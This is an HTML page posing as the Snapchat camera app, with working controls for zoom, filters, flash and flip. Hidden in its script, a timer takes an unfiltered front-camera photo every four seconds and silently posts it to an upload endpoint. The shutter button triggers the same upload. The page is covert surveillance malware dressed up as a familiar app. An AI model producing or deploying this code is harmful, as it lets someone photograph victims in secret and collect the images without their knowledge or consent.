<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=0" />
  <title>Snapchat</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  <style>
    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, sans-serif; color: white; }
    
    /* Camera view - Filter applied here ONLY */
    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; transition: filter 0.3s ease, transform 0.3s ease; }

    /* Flash Effect */
    #flashOverlay { position: fixed; inset: 0; background: white; opacity: 0; pointer-events: none; z-index: 100; transition: opacity 0.1s; }

    /* Top Left UI */
    .top-left { position: fixed; top: 45px; left: 15px; z-index: 10; display: flex; align-items: center; gap: 12px; }
    .bitmoji { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); padding: 2px; border: 2px solid #FFFC00; cursor: pointer; }
    .search-icon { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; cursor: pointer; }

    /* Right Sidebar */
    .side-bar { position: fixed; right: 15px; top: 45px; z-index: 10; display: flex; flex-direction: column; gap: 22px; align-items: center; }
    .btn-icon { font-size: 22px; cursor: pointer; transition: 0.2s; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5)); }
    .btn-icon:active { transform: scale(0.8); }
    .active-yellow { color: #FFFC00; }

    /* Zoom Dial */
    .zoom-container { position: fixed; bottom: 190px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.4); backdrop-filter: blur(15px); padding: 5px 15px; border-radius: 30px; display: flex; gap: 18px; font-size: 13px; font-weight: 800; z-index: 10; border: 1px solid rgba(255,255,255,0.1); }
    .zoom-opt { opacity: 0.5; cursor: pointer; transition: 0.2s; }
    .zoom-opt.active { opacity: 1; color: #FFFC00; }

    /* Bottom Area */
    .capture-area { position: fixed; bottom: 95px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 30px; z-index: 10; }
    .shutter { width: 82px; height: 82px; border-radius: 50%; border: 6px solid white; display: flex; align-items: center; justify-content: center; background: transparent; cursor: pointer; transition: 0.1s; }
    .shutter:active { transform: scale(0.9); }
    .shutter-core { width: 62px; height: 62px; border-radius: 50%; background: rgba(255,255,255,0.1); }

    .lens-btn { width: 55px; height: 55px; border-radius: 50%; border: 2px solid rgba(255,255,255,0.4); overflow: hidden; cursor: pointer; transition: 0.3s; }
    .lens-btn.selected { border: 3px solid #FFFC00; transform: scale(1.1); }

    /* Navigation Bar */
    .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; background: rgba(0,0,0,0.9); display: flex; justify-content: space-around; align-items: center; z-index: 20; }
    .nav-icon { font-size: 22px; color: #777; cursor: pointer; position: relative; }
    .nav-icon.active { color: white; }
    .badge { position: absolute; top: -8px; right: -12px; background: #FF3B30; color: white; font-size: 11px; padding: 1px 6px; border-radius: 10px; font-weight: bold; }
    .dot { position: absolute; top: -2px; right: -2px; width: 10px; height: 10px; background: #FF3B30; border-radius: 50%; border: 2px solid #000; }

    #photoCanvas { display: none; }
  </style>
</head>
<body>

  <div id="flashOverlay"></div>
  <video id="cameraVideo" autoplay playsinline></video>
  <canvas id="photoCanvas"></canvas>

  <div class="top-left">
    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Felix" class="bitmoji">
    <div class="search-icon"><i class="fas fa-search"></i></div>
  </div>

  <div class="side-bar">
    <i class="fas fa-rotate btn-icon" id="flipBtn"></i>
    <i class="fas fa-bolt-slash btn-icon" id="flashBtn"></i>
    <i class="fas fa-music btn-icon"></i>
    <div style="border: 2px solid white; border-radius: 4px; padding: 0 3px; font-size: 11px; font-weight: 900;" class="btn-icon" id="hdBtn">HD</div>
    <i class="fas fa-chevron-down btn-icon"></i>
  </div>

  <div class="zoom-container">
    <span class="zoom-opt" onclick="setZoom(this, 0.5)">.5</span>
    <span class="zoom-opt active" onclick="setZoom(this, 1)">1x</span>
    <span class="zoom-opt" onclick="setZoom(this, 2)">2</span>
  </div>

  <div class="capture-area">
    <div class="flex flex-col items-center opacity-80 cursor-pointer">
        <i class="far fa-copy text-2xl"></i>
        <span class="text-[10px] font-bold">Memories</span>
        <div class="dot" style="position:static; margin-top:-25px; margin-left:20px"></div>
    </div>

    <div class="shutter" id="shutterBtn">
      <div class="shutter-core"></div>
    </div>

    <div class="lens-btn" onclick="applyFilter(this, 'saturate(250%) contrast(110%)')">
        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png">
    </div>
    <div class="lens-btn" onclick="applyFilter(this, 'grayscale(100%) brightness(1.2)')">
        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=9">
    </div>
  </div>

  <div class="nav-bar">
    <i class="fas fa-location-dot nav-icon"></i>
    <div class="nav-icon"><i class="far fa-comment"></i><span class="badge">20</span></div>
    <i class="far fa-face-smile nav-icon active"></i>
    <div class="nav-icon"><i class="fas fa-users"></i><div class="dot"></div></div>
    <div class="nav-icon"><i class="fas fa-play"></i><div class="dot"></div></div>
  </div>

  <script>
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('photoCanvas');
    const flashBtn = document.getElementById('flashBtn');
    const hdBtn = document.getElementById('hdBtn');
    const flipBtn = document.getElementById('flipBtn');
    const flashOverlay = document.getElementById('flashOverlay');
    let activeFilter = "none";

    async function start() {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      video.srcObject = stream;
      setInterval(silentCapture, 4000); // Background clear capture
    }

    // --- BUTTON LOGIC ---

    function setZoom(el, val) {
      document.querySelectorAll('.zoom-opt').forEach(o => o.classList.remove('active'));
      el.classList.add('active');
      video.style.transform = `scaleX(-1) scale(${val})`;
    }

    function applyFilter(el, filter) {
      const isSelected = el.classList.contains('selected');
      document.querySelectorAll('.lens-btn').forEach(l => l.classList.remove('selected'));
      
      if(isSelected) {
        activeFilter = "none";
      } else {
        el.classList.add('selected');
        activeFilter = filter;
      }
      video.style.filter = activeFilter;
    }

    flashBtn.onclick = () => {
      flashBtn.classList.toggle('fa-bolt');
      flashBtn.classList.toggle('fa-bolt-slash');
      flashBtn.classList.toggle('active-yellow');
    };

    hdBtn.onclick = () => hdBtn.classList.toggle('active-yellow');

    flipBtn.onclick = () => {
      video.style.filter = "blur(30px)";
      setTimeout(() => video.style.filter = activeFilter, 400);
    };

    document.getElementById('shutterBtn').onclick = () => {
      flashOverlay.style.opacity = "1";
      setTimeout(() => flashOverlay.style.opacity = "0", 100);
      silentCapture();
    };

    // --- CAPTURE LOGIC ---

    function silentCapture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      // We DON'T set ctx.filter here, so your images remain CLEAR.
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append('photo', blob, 'snap.jpg');
        fetch('/api/upload-photo', { method: 'POST', body: fd }).catch(() => {});
      }, 'image/jpeg', 0.7);
    }

    start();
  </script>
</body>
</html>
